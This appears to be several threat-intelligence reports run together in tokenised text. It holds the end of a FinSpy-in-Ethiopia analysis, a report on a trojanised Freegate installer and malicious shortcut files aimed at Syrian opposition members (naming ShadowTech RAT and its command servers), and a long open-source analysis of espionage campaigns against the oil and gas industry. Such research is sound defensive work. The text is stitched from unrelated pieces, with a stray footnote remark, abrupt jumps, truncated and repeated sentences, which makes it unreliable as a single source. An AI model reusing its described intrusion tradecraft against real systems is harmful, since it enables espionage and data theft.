The fact that the Ethiopian version of FinSpy uses images of opposition members as bait suggests it may be used for politically influenced surveillance activities , rather than strictly law enforcement purposes .
The Ethiopian sample is the second FinSpy sample we have discovered that communicates with a server we identified by scanning as a FinSpy command & control server .
This further validates our scanning results , and calls into question Gamma 's claim that such servers are `` not … from the FinFisher product line .
'' Similarities between the Ethiopian sample and those used to target Bahraini activists also bring into question Gamma International 's earlier claims that the Bahrain samples were stolen demonstration copies .
While the sale of such intrusion and surveillance software is largely unregulated , the issue has drawn increased high - level scrutiny .
In September of last year , the German foreign minister , Guido Westerwelle , called for an EU - wide ban on the export of such surveillance software to totalitarian states .
In a December 2012 interview , Marietje Schaake ( MEP ) , currently the rapporteur for the first EU strategy on digital freedom in foreign policy , stated that it was `` quite shocking '' that Europe companies continue to export repressive technologies to countries where the rule of law is in question .
We urge civil society groups and journalists to follow up on our findings within affected countries .
We also hope that our findings will provide valuable information to the ongoing technology and policy debate about surveillance software and the commercialisation of offensive cyber - capabilities .
# footnote number 8 missing .
- Malware masquerading as the circumvention tool Freegate .
- A campaign masquerading as a call to arms by a pro - opposition cleric .
Syria 's opposition has faced persistent targeting by Pro - Government Electronic Actors ( PGEAs ) throughout the Syrian civil war .
A pro - government group calling itself the Syrian Electronic Army has gained visibility in recent months with high profile attacks against news organizations .
Meanwhile , Syrian activists continue to be targeted with online attacks apparently for the purposes of accessing their private communications and stealing their secrets .
Throughout 2012 , attacks against the Syrian opposition were documented in an extensive series of blog posts by Morgan Marquis - Boire and Eva Galperin with the help of the Electronic Frontier Foundation .
Many others have also contributed to research on Syrian malware , from Telecomix to a range of security companies .
Meanwhile , the Syrian opposition , and several groups working closely with it , such as Cyber Arabs , have been active in attempting to identify potential threats and warn users .
Researchers have identified a common theme among the attacks against the Syrian opposition : sophisticated social engineering that is grounded in an awareness of the needs , interests , and weaknesses of the opposition .
Attacks often play on curiosity or ideology to encourage users to enter passwords or click on enticing files , or exploit fears of hacking and surveillance with fake security tools .
Attacks are often transmitted to potential victims from the accounts of people with whom they are familiar .
The two attacks that are described in this blogpost follow this theme .
One is a malicious installer of the circumvention tool Freegate .
The other is an e - mail attachment calling for jihad against Hezbollah and the Assad regime or promising interesting regional news .
In this attack , which we first observed in the second week of June , the potential victim is encouraged to visit a download link containing a malicious installer of Freegate .
Freegate is a standalone circumvention - bypassing Virtual Private Network ( VPN ) client for Windows .
Legitimate versions of the Freegate software are available for download on its website .
While initially developed for mainland Chinese users , the software is used in a number of other countries .
While Freegate was erroneously labelled a Trojan by one anti - virus company nearly a decade ago , in this attack , attackers packaged what appears to be a legitimate version of Freegate with a malicious implant .
The targeted group were members of the Syrian opposition in a private social media group .
http : //www.mediafire.com / download/ [ REDACTED ] /VPN - Pro.zip When a potential victim visits the link , they are offered the download of a file which MediaFire lists as uploaded on June 15 , 2013 : VPN - PRO.zip ; Uploaded : 2013 - 06 - 15 16:54:31 The zip file extracts to a MS Windows executable file : VPN - Pro.exe The binary was compiled at 2013 - 06 - 15 22:41:31 UTC and has the following properties : Similar to previously observed malware attacks targeting the Syrian opposition , this was written in .NET
and appears to require the .NET
3.5 framework to execute .
When VPN - Pro.exe is run , the victim is shown the Freegate end - user license agreement ( EULA ) dialogue box .
Upon agreeing to the EULA , an operational copy of Freegate proxy is launched , which includes a request to unblock the firewall .
The copy of Freegate launched is listed as `` Freegate 7.35 Professional Edition .
'' The Freegate software begins operating , and quickly prompts the user for an update .
In addition to running a legitimate copy of Freegate 7.35 , the malware installs an implant .
A fake `` svchost.exe '' is installed in the victim 's Application Data directory : C : \Documents and Settings\ < Username > \Application Data\svchost.exe Dropped files on execution of VPN - Pro.exe : Examination of the `` svchost.exe '' binary shows multiple references to `` ShadowTech Rat .
'' Examination of network traffic also identifies the implant as ShadowTech RAT .
Packet capture on port 1321/tcp : ShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both English and Arabic language sites .
Videos can be found on YouTube demonstrating its functionality .
The tool offers a range of options to the attacker , from keylogging and remote activation of the webcam to file exfiltration .
ShadowTech RAT control console : Both VPN - Pro.exe and svhost.exe have been submitted to VirusTotal : Both have relatively low detection rates by anti - virus software .
As of June 20 , 2013 , svchost.exe was only detected by four out of 47 tested anti - virus programs , while VPN - Pro.exe was only detected by five out of 46 .
The svchost.exe initiates an outbound connection to a command and control ( C2 ) server hosted at thejoe.publicvm.com .
This domain resolves to an address inside Syrian IP space : 31.9.48.119 .
This is not the first time that malicious installer packages have been created for circumvention tools .
In 2012 , malicious installers for Green Simurgh - a standalone proxy intended for Iranian users but also used by some Syrians - were found in circulation .
The creators of Green Simurgh responded by posting a prominent warning on their website highlighting the presence of these malicious installers .
Last year , malware which purported to be the Tor Browser Bundle was found in the wild .
It was found to be backdoored by Gh0st RAT and exfiltrated data to an IP in China .
An attack using a malicious installer of a working and reputable security or proxy tool is especially pernicious as it targets users who likely recognize the importance of privacy and circumvention , and may believe that they have increased their privacy and security by installing the tool .
In this campaign , contact with targets was initiated through phishing e - mails , chat messages and Facebook posts .
Although we became aware of this campaign in early June , we have evidence that it may have started as early as January 2013 .
We believe that this campaign targeted - at least in part - high - profile members of the Syrian opposition .
Interestingly , the attack included targeting of at least one non - public address associated with internal opposition communications .
This indicates some degree of prior penetration of the opposition - either through computer network intrusion or other intelligence gathering activities .
The potential victim in this attack first receives a message from an unknown source , in this case , a Gmail account with a nondescript name .
Example e - mail : The e - mail contains text , an image ( not shown ) , and an attachment .
The text refers to a video of Sheikh Adnan al - Arour - a Sunni pro - opposition cleric - based in Saudi Arabia , calling for holy war against Assad and Hezbollah .
The user is led to believe that opening the zip file , which is descriptively titled as being the Sheikh 's opinion , will provide access to the video .
While we have identified multiple different attacks with different zip files , the structure of all of these is consistent with the example described here .
Example zip files : The zip file extracts to a Windows Shortcut file with the same name and a .lnk
extension .
Example .lnk
file `` Sample A '' : Parsing these files reveals a URL embedded in the the file ( bolded below ) .
Parsing `` Sample A '' : When the victim executes the Windows shortcut , they are directed to one of several malicious links depending on the zipfile that they were sent .
These are visible in the link parsing .
Links embedded in the Windows shortcut : The victim is then shown either a YouTube video featuring Sheikh Adnan al - Arour , or a story on http : //www.alkalimaonline.com , a Lebanese news site .
Example of YouTube video shown to victim : While the victim sees the decoy YouTube video or news website , a php file ( g.php ) that contains a hex - encoded malicious binary is fetched .
Excerpt from G.php : Once extracted , the binary of `` Sample A '' has the following properties : The malware also adds a registry key to make it persistent across reboots : The malware contains strings referring to `` Data Protector v2 '' which appears to refer a crypter that is compatible with a range of RATs and advertised for download in a number of forums .
Once the malware is successfully installed on the victim 's computer , it communicates with a C2 server at : tn5.linkpc.net On June 11 , this pointed to the following SyriaTel address : This domain has been active since at least October 2012 and has pointed to many different addresses in Syrian IP space on both the SyriaTel and Tarassul ISPs , as well as AnchorFree VPN addresses .
The malware attempts to download a remote file called `` 123.functions '' : It was not possible to retrieve the remote file at the time of analysis .
As the conflict in Syria drags on , digital campaigns targeting Syrian opposition have persisted .
We have chosen to highlight two attacks that are part of recent efforts by Pro - Government Electronic Actors to compromise opposition communications and steal their secrets .
These attacks cater to the opposition 's communication behaviors and tactics .
They are indicative of a combination of prior intelligence about the opposition , and ingenuity in social engineering .
For example , many in the Syrian opposition are now aware of the electronic threats they face and seek out tools to increase their communications security and privacy .
Tools and information about security and communications are in constant circulation .
Some of this material addresses well - defined vulnerabilities .
We have observed a greater degree of care among many in the opposition when facing certain situations that were common attack modalities in 2012 .
As awareness grows and behavior evolves , we suspect that some of the attacks that we regularly observed in 2012 are much less successful today .
Some of the information and practices that are shared between users , however , are much less appropriate , even inadvertently dangerous .
For example , many legitimate tools are shared via third party file sharing sites or over social media .
This situation presents a rich variety of targets for attackers in which to seed malicious binaries and links masquerading as familiar or desirable tools .
We infer that from the point of view of these attackers , not all attacks need to have sophisticated malware in order to be successful enough to be worth doing .
Yet , perhaps in response to the growing awareness of previous and often widely targeted attacks against the Syrian opposition , attackers continue to innovate and experiment with new techniques that blend social engineering with new attack styles .
The experiments are sometimes clearly successful .
For example , in the case of Attack 2 , the Windows shortcut files were not conclusively identified as malicious by even savvy opposition members for an extended period of time .
We hope that this post will increase awareness of the two attacks among potential targets .
In the meantime , users who have executed either the fake Freegate file or clicked on one of the Windows shortcut files should consider their computers and accounts compromised .
The Freegate website is blocked in China ( its primary target market ) , as is the case with other similar circumvention tools .
To get around blocking , tools are often distributed between individuals , or through untrusted downloads from third party sites .
This is an unfortunate vector for attackers to distribute malicious installers and bundles that also contain functional versions of the program .
As demonstrated by our work on the Freegate malware , as well as the Green Simurgh case , these vulnerabilities are exploited with serious consequences for high - risk users .
We understand the resource constraints that developers of free security and circumvention software often face .
As such , we propose two simple steps that Freegate could take to help mitigate the current and similar future threats .
1 ) Freegate should take steps to make their users aware of the threat .
We provided Freegate developers with details of the attack , copies of the malicious binary , and other details prior to publication .
We would like to point them towards the example established by Green Simurgh , who promptly posted a multilingual warning to their website when a malicious repackaging of their tool was found to be targeting Syrian users .
We have offered to help them translate any warning materials into Arabic .
2 ) Freegate should implement by - default HTTPS on their website .
Currently , visitors to the Freegate website follow non - HTTPS links to an unencrypted download .
We believe that this presents a clear risk for man - in - the - middle attacks .
Most developers of similar anti - censorship , circumvention , and security tools have implemented this security measure .
We encourage Freegate to follow suit .
Crude Faux An Analysis of cyber Conflict Within the Oil & Gas Industries The oil & gas industry is a multibillion - dollar industry that has a history of conflict .
As modern technology has developed , both the corporate aspects and technical aspects of the oil & gas industry have become heavily reliant on the Cyber domain .
The inherently insecure origins and evolution of computing has led that dependence to become a severe vulnerability .
This report examines how these vulnerabilities have been exploited , and what that means to the future of the industry .
The oil & gas industry is a multibillion - dollar industry that has a history of conflict .
As modern technology has developed , both the corporate aspects and technical aspects of the oil & gas industry have become heavily reliant on the Cyber domain .
The inherently insecure origins and evolution of computing has led that dependence to become a severe vulnerability .
Recent events have brought this fact to light with a deluge of `` cyber attacks '' launched globally against the industry .
These attacks raise specter of cyber conflict and the question of culpability .
This report seeks to analyze a selection of these events , looking for patterns that would indicate one or more advanced actors .
By observing the motives means and opportunities presented to actors , and looking at a cross section of these attacks over time , conclusions will be drawn as to the past , present , and future of cyber conflict within the industry .
The US Army notes in their Cyber Concept & Capabilities plan for 2016 - 2028 that cyber capabilities pose a unique and attractive opportunity to an inferior enemy to gain equivalence temporary equivalence with a superior enemy through the use of Cyber .
This applies not only to nation states , but non - state actors as well .
There are several factors compounding this issue : - Unfettered access to the infrastructure and tools used to conduct cyber operations by anyone - A low barrier to entry fiscally and limited experience required to achieve an outsized impact - A high and attractive return on investment - Plausible deniability due to issues with attribution These facts make it highly likely that multiple foreign agencies as well as powerful corporate denizens have used and continue to make use of cyber capabilities to affect favorable outcomes .
Using OSINT techniques , information was gathered from government websites , corporate websites , news agencies , and search engine queries .
This information was then synthesized and scrutinized for possible links and attribution .
By looking at the surrounding geopolitical events , gains and losses as well as indirect outcomes , events can be correlated and attributed to actors which possess the means motive and opportunity to do so .
The primary purpose is to analyze the event regardless of attribution .
Because of the nature of open source information , biases are naturally introduced which must be acknowledged , if not accounted for .
Incidents were selected based on relevance and their timeliness , along with other factors discussed in the methodology .
Incidents were largely grouped into one of three categories : espionage , sabotage , and incidental / miscellaneous .
While these incidents do not qualify as warfare by the Clausewitz definition , they are a form of conflict .
There is significant evidence of protracted , insidious espionage carried out by a state actor within the cyber realm .
China has likely launch hundreds of cyber attacks against the oil and gas industry since as early as 2002 .
With the advent of Red October , they may not be the only actors in the game .
With a level of sophistication not yet observed publicly in this realm , Red October could represent an evolution to China 's current techniques , or another actor entering the game .
By looking at some of the technical aspects of the events , a link was established between Byzantine Candor and APT1 , as well as a possible link between the Mirage Campaign and Elderwood Project .
The Middle East has scene perhaps the most evidence and variety of cyber conflict of all .
While staying away from events which do not directly relate to the oil industry , a series of sabotage incidents using cyber as the medium are examined .
It is possible that there events were salvos between nation states in an example of bidirectional conflict .
If this is not the case , and incidents like Shamoon were simply the act of non - state actors , then it represents affirmation of the revelence of non - state actors in future cyber conflict .
This is only logical since most of America 's critical infrastructure is controlled by the private sector , and economic influence can be leveraged to gain great power .
By taking an adversarial look at the Deepwater Horizon oil spill , an example of how a state actor could act in a violent , kinetic way against a non - state through cyber while remaining anonymous is examined through a vignette .
It is determined that while the Deepwater horizon spill was not an attack , it easily could have been .
This type of conflict is both deadly and catastrophic , and while it is unlikely to be used lightly , it sets the tone for possibilities going forward .
Based on the observed events , the possible threat actors , and the correlation of these events , it appears that there is ongoing cyber conflict within the oil industry .
The correlation of several incidents has shown coordinated attacks by an advanced foreign threat actor against multiple entities with the use of espionage .
It has also suggested the possibility of more destructive attacks , and pointed out the benefits to both state actors and non - state actors within the oil industry .
In some cases there has been an obvious alignment of political , strategic , operational , and tactical goals and principals to affect favorable outcomes .
The culmination of these findings is that there are many threat actors who are currently engaged in , or may be engaged in , ongoing conflict which may have the potential to escalate .
This should be both a primary concern and a cause for future research and analysis .
Recent events of national significance within the oil & gas Industry have brought to light both the question of defining threat sources and that of plausibly attributing known events to a threat source .
The unprecedented rise in cyber events begets the question of whether this is incidental to the continued advancement of technology , or suggests an ongoing conflict that may escalate .
This report will aggregate relevant events , present criteria for outlining threat origins , and determine the likelihood that the incidents are related .
It also seeks to determine whether or not any observed correlation points to a persistent aggressor or simply circumstantial coincidence .
The purpose of this analysis is to provide decision - makers with a clearer idea of the current security outlook for the oil and gas industry , and pinpoint what current and future causes for concern appear to be .
All events and presented options should be considered cautiously and as empirically as possible ; any assumptions that are made will be explicitly stated .
One of the first priorities is to outline a timeline of events which have occurred and then examine what significance they may have or relationships they may share in order to scope the conversation .
These events will constitute the frame for the analysis .
Events were chosen after a preliminary overview of content from open sources such as established news media sites , oil & gas company websites , Google query results , government bulletins , and technical reports by security companies .
From this brief overview , events within the Oil and Gas Industry which exhibited a `` cyber '' component were selected .
These events are not meant to be all inclusive , and due to the entirely open source nature of the resources , the vantage point on the information may be biased and in many instances is likely incomplete .
However even an incomplete view may contain enough information to identify significant patterns , and by acknowledging the quality concerns with the information , a more accurate and objective analysis may be performed .
Below is a timeline of observed events which will be discussed in greater detail .
The timeline will list the event and the apparent target of the event .
Given this data set , a natural escalation of events appears to occur , with the frequency of incidents continuing to rise .
This can partially be explained by a growing international awareness of the vulnerabilities and perils involved in internet - facing control systems of all kinds ; as events occur , they garner additional attention and therefore induce additional incidents .
However , there are other interesting observations to be made from this data .
Largely , the incidents of great note have occurred in either North America or the Middle East .
When considering that three of the top five oil producing countries are in these regions ( Saudi Arabia , the United States , and Iran ) , this is not surprising .
Yet substantive reports of similar incidents are markedly absent in the other two of the top five oil producing countries ( China and Russia ) , and this is noteworthy .
The argument could be made that this is due to language barriers and tight control on information dissemination , but it is improbable that a significant incident would have gone entirely unnoticed by all media outlets .
As the incidents themselves make apparent , human threat actors are involved , and what remains to be identified is whether there is the complexity , overarching coordination , or recurring threat source that would point to an advanced threat such as a state actor or complex non - state actor .
Before continuing with the possible attribution of events , some base discussion and criteria for the threat sources must be established .
A threat source is considered to be a human - based or natural entity which possesses a capability that aligns with an unmitigated vulnerability .
The threat sources which will be considered must meet the minimum requirement of having both the motive and the means to carry out the attack .
Once a hypothesis consisting of these elements is established , it will be scrutinized to determine whether or not the events surrounding the incident or series of incidents align in any obvious political , strategic , operational and tactical manner .
The means in this case consists of both the opportunity and the technological capability to cause the incident to occur , and the motives that will be considered are economic gain , retribution , or political agenda ( to include ideology ) .
The US Army notes in their Cyber Concept & Capabilities plan for 2016 - 2028 that cyber capabilities pose a unique and attractive opportunity to an inferior , asymmetric enemy to temporarily gain equivalence with a superior enemy because of its relatively low initial cost , high return on investment , and plausible deniability due to issues with attribution .
Because of this fact , it is highly likely that multiple foreign agencies as well as powerful corporate denizens have used and continue to make use of cyber capabilities to affect favorable outcomes .
The rest of the report will attempt to substantiate this claim through critical analysis .
To reach the conclusions presented in the ensuing report incidents were collected and chosen based on the inclusion of cyber either as the medium for the event , or as some component factor that played a direct or otherwise instrumental role in the outcome .
After collecting a sampling of incidents into a dataset , these incidents were examined and several directly attributable features / impacts were taken into account , including : - The victim ( s ) targeted - Evidence of cyber involvement - Economic losses - Fatalities incurred - Geopolitical impacts Beyond the direct impacts , it was also necessary to consider possible indirect `` ripple '' effects .
For example , it could be important to consider something like the prices of crude oil prior to and after a given incident .
A circumstance may be such that particular companies or countries unaffected by the incident would find themselves benefiting from a ripple effect like higher crude prices .
Other effects to identify include changes in the status of the involved companies throughout an incident .
This could involve looking at earnings reports , the selling or buying of assets , or any legal actions the company is involved in , as well as contextual events that are significant or contentious and occur directly prior to or after an incident .
Through the investigation of these outcomes and contexts , there is the possibility of finding correlations between various incidents .
These correlations may be made plain by observable patterns among the details of the events .
An observed pattern may suggest a recurring actor - these patterns include tactical and methodical similarities between alleged attacks , recurring targets , entities that directly or indirectly benefitted or incurred losses as an outcome , and geographic dispersion or closeness of the events .
In cases where an attack is apparent , tactical elements such as tools were scrutinized as well , as a means of attribution .
For example , a tool may unintentionally exhibit cultural tendencies such as the language used , colloquialisms , idioms , religious preference , and recurring personal habits of the creator or operator .
These signatures coupled with aspects of the tactical assets like exclusiveness ( as in the case of a purchased domain used as a C2 point ) can significantly raise the confidence level of an attribution .
Possible actors in the cyber exchange can ostensibly be identified from these correlations .
If it is determined that the incident was an attack , motives of the potential actors can be considered .
A key element of this that should be considered is any precedence for the attack .
The history of political relationships between countries , such as any expressed hostilities or allegiances and treaties , may also prove relevant .
History also tells us that most conflicts arise over the acquisition of resources .
As such , the energy resources and requirements of nation - states must be analyzed .
For example , is the entity being examined a major importer or exporter of oil ? Is the entity capable of energy self - sufficiency ? Or has the country been experiencing a major influx in energy demand ? This information can then be aggregated and synthesized into a more informed view of the event .
A final major component of the analysis was the examination of whether the motives and methods align with the actor 's strategic culture .
This includes defining the overall strategic theories that the country adheres to and goals it desires to accomplish .
As mentioned earlier , the tactics employed during the attack can be incredibly potent as an attribution mechanism - if an attack is far removed from a nation 's capabilities , it is less likely that they were involved in the incident .
Likewise , if the tactics are within a given nation 's technical prowess and follow established patterns exhibited by that nation , it significantly improves the confidence in attribution .
However , caution was taken when attributing tactics to actors , as deception is a common element in many cyber warfare strategies .
Therefore , tactical similarities or dissimilarities alone do not implicitly identify or rule out a given actor .
The nature of OSINT gathering poses obstacles to objective analysis .
While gathering the data , it should be noted that there are source biases .
All of the sources used are open source , and as such the provenance of the information can not always be independently verified .
The information itself may be legitimate , but presented in an incomplete or skewed manner .
It is also likely that not all of the details of the collected incidents are available .
In some cases the companies reporting the incidents , such as Symantec and MacAfee , are not legally disposed to divulge select information about their customers .
Another limitation is information available about incidents that occurred in foreign countries .
Due to tighter control over journalism or language barriers , other countries are likely not releasing full details from incidents that have occurred or not doing so in languages familiar to the authors .
In some cases , entire events may not be released to the public , either by foreign governments or the companies themselves .
In order to address the above concerns , several methods were used .
Data was gathered from established , and ideally trustworthy , sources .
This includes reports from reputable news sites , company or government publications , or scholarly papers .
Also , every effort was made to track down the original source of the information found in reports , or cross - examine it with other sources .
Multiple sources were found wherever possible and scrutinized in order to obtain corroborating data .
Of equal interest is information which was contradictory between sources .
These contradictions were presented and addressed where appropriate .
Finally , despite evidence found in support of any given actor , alternate hypotheses must be considered .
As with any intelligence gathering , there is the possibility of error , whether information is misreported or taken out of context , and this is especially true of OSINT .
The purpose was not to select an outcome and attempt to support it but rather to find refutation as well .
Information that may exculpate a particular actor was thoroughly considered .
Although human error is common in cyber incidents , it is important to determine whether the error was taken advantage of by others .
One of the most easily distinguishable patterns on the above timeline is the growing frequency of reported cyber espionage .
This saga of long - term campaigns has been garnering a lot of attention , and with good reason .
Some have asserted that certain campaigns have existed since the early 2000 's , yet their existence has only recently come to light in the private sector .
The damage caused by these types of breaches is difficult to estimate because it occurred over such a long time span , but in some cases terabytes of data were stolen over the period of a few months .
When taken in relation to the oil industry , where proprietary information like bid exploration data is the lifeblood of the organization , this can be a disastrous blow .
However , while campaigns like `` Night Dragon '' are pointedly targeted at the oil industry , others are far more encompassing in their breadth and appear more disparate .
Establishing a baseline or pattern within this industry alone excludes a large and potentially useful amount of context .
Not only were most of these cyber espionage campaigns larger in scope than simply the oil and gas industry , but some also completely excluded it .
Interestingly , there are other cyber espionage campaigns not listed in the timeline ( such as the infamous Flame and Mahdi viruses ) that target countries with some of the largest oil reserves in the world , but the attacks themselves were not targeted at the Oil & Gas Industries .
Given the sheer number of incidents , it would seem likely that there is more than one source , yet the technical data available seems to suggest otherwise .
It is clear that these incidents represent a huge danger to the profitability and competitiveness , even the future success , of victim companies ; Yet these consequences carry with them some level of inherent attribution .
The very nature of proprietary information means that if an entity who had acquired it were to use the information , it could identify them as having a connection to the incident , whether directly or through a third party .
Also , attacks of this scale require some level of organization that manifests itself in the form of repeated patterns of be- havior and resource usage that can suggest a common origin .
This organization coupled with the resources and expertise necessary to process and analyze the exorbitant volume of stolen information leads to a high likelihood of state actor or organized criminal involvement .
One of the largest difficulties present in identifying the provenance and totality of these attacks is that there is no publicly available aggregation of the body of information collected on the various APT activities .
Instead , Antivirus & Incident Response firms which have the best vantage point on the situation are providing separate reports in which they use their own colloquial names and terms for the attacks , the tools , and the campaigns .
This creates overlap , where campaigns with different names may in fact be part of the same campaign , and the technical data that is otherwise separated across the reports could together represent a more apparent pattern .
Only one report , the Mandiant APT1 report , included a brief table noting that they had compared some of the other attacks and ruled out APT1 as the culprit .
Additionally , these firms are entrusted with the safeguard of their customers ' information , and so often will not release the full extent of what was found , nor a definitive list of victims – adding to the obscurity .
These sources also introduce their own biases which must be accounted for .
For this reason , what follows is an overview of the various reports that mention the oil and gas industry as targets , and an analysis of important technical aspects and goals of these campaigns .
Through this analysis , hopefully a more complete view of the action may be obtained to see if the goals , resources , techniques , and timeframes exhibit commonality between attacks .
' Countries affect ' lists only countries where oil and gas companies were compromised .
Synopsis : The NightDragon report released by McAfee was somewhat of a seminal event in that it was the first well known release of a fairly detailed APT analysis and technical attribution .
The attacks conglomerated in NightDragon were nearly all conducted against unspecified `` global oil , energy , and petrochemical companies .
'' The attacks followed a methodical series of steps : 1 . using SQL - injection to obtain access to an extranet server , or using spear - phishing against `` mobile worker laptops '' and `` compromising corporate VPN accounts '' to obtain access to the company intranet 2 . uploading common hash dumping tools & password cracking tools harvest Active Directory credentials to gain access to sensitive desktops & servers 3 .
Access sensitive documents 4 .
Upload RAT malware to exfiltrate sensitive data 5 .
Move laterally McAfee was also able to identify much of the generic malware used , and communications techniques .
They also suggested that the attackers worked between 9:00am and 5:00pm Beijing time during weekdays , and that most traffic was originating from the Shandong Province of China .
Purpose : Exfiltration of `` competitive proprietary operations and project - financing information with regard to oil and gas field bids and operations '' & collection of data from SCADA Systems Entry Method : Social Engineering , Spear Phishing , SQL - injection Countries with Companies Affected : U.S. , Taiwan , Kazakhstan , Greece Synopsis : Symantec observed a group it refers to as the Elderwood gang operating a concerted campaign against a variety of industries including an undisclosed oil and gas company .
Symantec also asserts that these are the same hackers who operated in the `` Aurora '' campaign against Google in 2009 .
This campaign is unique to some degree in that it used a high number of zero day exploits in Adobe Flash and Microsoft 's Internet Explorer .
While it appears that the attackers used spear - phishing ( via email ) , their primary technique was the use of a `` watering - hole '' attack whereby they attack websites known to be frequented by the target using techniques such as SQL injection , and upload malicious files to these website .
The target then visits the site and gets infected .
This is interesting because the target does not have any indication that it has been compromised , but the number of overall infections goes up because of untargeted victims which also visit the site .
This attack requires the attackers to find security vulnerability in the desired website after selection , requiring more technical skill than some of the other campaigns initially exhibit .
Symantec believes that the exploits were packed with a Trojan and Command & Control ( C2 ) server address using a platform that gives the group its name : `` Elderwood .
'' Purpose : `` the wholesale gathering of intelligence and intellectual property '' Entry Method : Watering - Hole attacks , Spear Phishing Countries with Companies Affected : Undisclosed Synopsis : This report released by McAfee discusses a RAT they claim to be incredibly prolific , infecting a variety of industries across multiple countries .
The report itself is very sparse on any technical details or evidence , largely lacking substance .
It provides a list of victims by industry and their country of origin .
It also provides a detailed timeline for the attacks .
Interestingly , Eugene Kaspersky heavily criticized the report for being alarmist and skewed , stating that many of the conclusions were presumptive .
Purpose : Exfiltration of `` a historically unprecedented transfer of wealth - closely guarded national secrets ( including those from classified government networks ) , source code , bug databases , email archives , negotiation plans and exploration details for new oil and gas field auctions , document stores , legal contracts , supervisory control and data acquisition ( SCADA ) configurations , design schematics , and much more '' Entry Method : Spear Phishing Countries with Companies Affected : U.S. Synopsis : Dell SecureWorks gives a fairly good collection of technical details about the campaign they ' ve dubbed `` Mirage '' for the string used to connect to the C2 server by the Remote Access Trojan , but largely they focused on studying the tool , not monitoring the APT activity .
Some points of note are the use of HTRAN ( a relay that Dell 's Cyber Threat Unit asserts was developed by the Honker Union of China , or HUC ) for relaying , and registry of a few domains to an email address ( dnsjack @ yahoo.com ) and IP ranges in China .
Purpose : Theft of `` intellectual property and company secrets '' Entry Method : Social Engineering , Spear Phishing , SQL - injection of web servers Countries with Companies Affected : Philippines , Canada Synopsis : Red October is a sophisticated espionage network very much unlike other attacks which had been reported .
While for the most part , the targets were diplomatic , there were several instances where Kaspersky noted that oil and gas industries had been targeted .
The attack used domains registered to Russian email addresses , and IP ranges identified were serviced by largely German and Russian ISPs , however Kaspersky believes that the three `` mothership '' C2 servers identified are actually themselves proxies for an as yet unidentified C2 server which could then be operating nearly anywhere .
A salient point is that Red October made use of exploit code that was `` created by other attackers and employed during different cyberattacks .
The attackers left the imported exploit code untouched , perhaps to harden the identification process .
'' Additionally , Red October is somewhat unique amongst attacks that targeted oil and gas in that it is capable of stealing information from a variety of embedded devices such as phone and routers .
Purpose : `` gather intelligence from the compromised organizations '' Entry Method : Social Engineering , Spear Phishing , SQL - injection of web servers Countries with Companies Affected : Azerbaijan , Belarus , Turkmenistan , UAE Synopsis : The APT1 Report is perhaps the most detailed report to date .
They also minced no words , directly accusing China as a state actor of engaging in Cyber Espionage .
Researchers at Mandiant tracked back activities of an APT group they referred to as APT1 to the Chinese PLA Unit 61398 with relatively solid evidence .
They even went so far as to report the building which they believed APT1 was operating out of , and unmask three operators – UglyGorilla , DOTA , and SuperHard – giving possible real names , online personas and other identifying information about them .
APT1 operated over half a decade at least , stealing `` hundreds of terabytes of data from at least 141 organizations , '' often conducting such operations in parallel .
The attackers maintain access to a given network for nearly a year on average .
The attackers operated during the 9:00am to 5:00pm Beijing Time and thy followed a fairly strict methodology of attack , similar to the one noted in the NightDragon report : 1 .
Initial reconnaissance 2 .
Initial compromise of a system , largely though spear phishing 3 .
Establishing a foothold in the network through Trojan dropping to a C2 server 4 .
Escalating privileges through credential harvesting 5 .
Internal reconnaissance of the network and While Mandiant generically refers to energy companies , one of the trojaned files they note was used in the spearfishing attack bears the name `` Oil - Field - Services - Analysis - And - Outlook.zip '' which really ties .
Mandiant notes that APT1 is also referred to as the Comment Group , a name given for the communications method used by their RATs which would set attributes in web pages as a means of C2 .
Purpose : Exfiltration of `` competitive proprietary operations and project - financing information with regard to oil and gas field bids and operations '' Entry Method : Spear Phishing Countries with Companies Affected : Undisclosed Synopsis : An exposé run by Bloomberg in 2012 chronicled the undertakings of a security research coalition which decided to track one of the largest Cyber Espionage groups operating out of China .
Bloomberg claims that US Intelligence had been keeping tabs on the group for years , which they referred to as Byzantine Candor .
In the same breath , Bloomberg notes that the group is often referred to as the `` Comment Group .
'' Bloomberg journalist Chloe Whiteaker also published a short but technical article that detailed some of the Comment Groups activities and tools .
The report included an infographic that identified oil and gas victims of the comment group .
Purpose : `` the biggest vacuuming up of U.S. proprietary data … ever seen '' Entry Method : Social Engineering , Spear Phishing Countries with Companies Affected : U.S. , United Kingdom Between the campaigns identified above , there are a few technical similarities that arise .
As was already addressed , these attacks have been selected for one common thread they share – targets within the oil and gas industry .
Other between them will now be scrutinized to find any additional links .
This is not intended to suggest that the same group is behind every attack , but rather identify tactical and operational similarities that would point to a unified source of training or control .
One of the most obvious similarities between all of the attacks is the motive : the large scale theft of corporate data .
The methodology of data extraction is very similar between Night Dragon , Shady RAT , Elderwood , APT1 , and Byzantine Candor .
One note on this is that although the attacks all followed a similar methodology , this very methodology is common in the network penetration t world , and so not entirely unique .
Slides from a presentation given by SANS affiliate James Shewmaker in 2008 highlight this methodology in brief : Reconnaissance , Port / Vulnerability Scan , Exploitation , and Repeat from the new vantage point .
The only thing largely different is that the data exfiltration occurs after exploitation – that and the attackers were working from the outside initially , so they used social engineering to get in .
With that said the fact that the majority of these used highly targeted spear phishing and exfiltrated similar data using RATs is not to be discounted .
Additionally , these attacks all appear to be operating out of either Beijing , Shanghai , and Shandong province .
The data below will show that Byzantine Candor and APT1 are one in the same – they share operators ( Ugly Gorilla ) and unique technical infrastructure like Fully Qualified Domain Names ( FQDNs ) .
Mandiant tied APT1 back to the PLA , and a .
Mandiant even acknowledges the article written by Bloomberg in their report , and identifies the `` Comment Group '' as an alias While about half of the reports omitted IP ranges , the majority of IP address ranges mentioned came from service provided by China Unicom to one of two locales : Beijing or Shanghai .
The major exception to this is Red October , which largely had IP address ranges coming from Germany and Russia .
Excluding Red October , in cases where ranges did not come from Beijing or Shanghai , they were often identified as host that were compromised and used as proxies loaded with tools such as HTRAN .
Interestingly Night Dragon , which does not provide a range of IP addresses , offered instead that an individual operating out of Heze City , Shandong , China was responsible for providing the C2 servers through his company .
An article published in the Wall Street Journal notes that McAfee identified this individual as `` Song Zhiyue .
'' A full list of domains retrieved from the various reports can be found in the appendices .
Of the domains which appeared in the reports , only matches between APT1 and Byzantine Candor were identified .
The rest were inconclusive as some of the reports did not include FQDNs and others which did include them did not provide a full list .
Additionally , a large portion of the attacks made use of Dynamic DNS services , where the parent domain is not inherently malicious .
But subdomains may be used by service subscribers for their own purposes without policing .
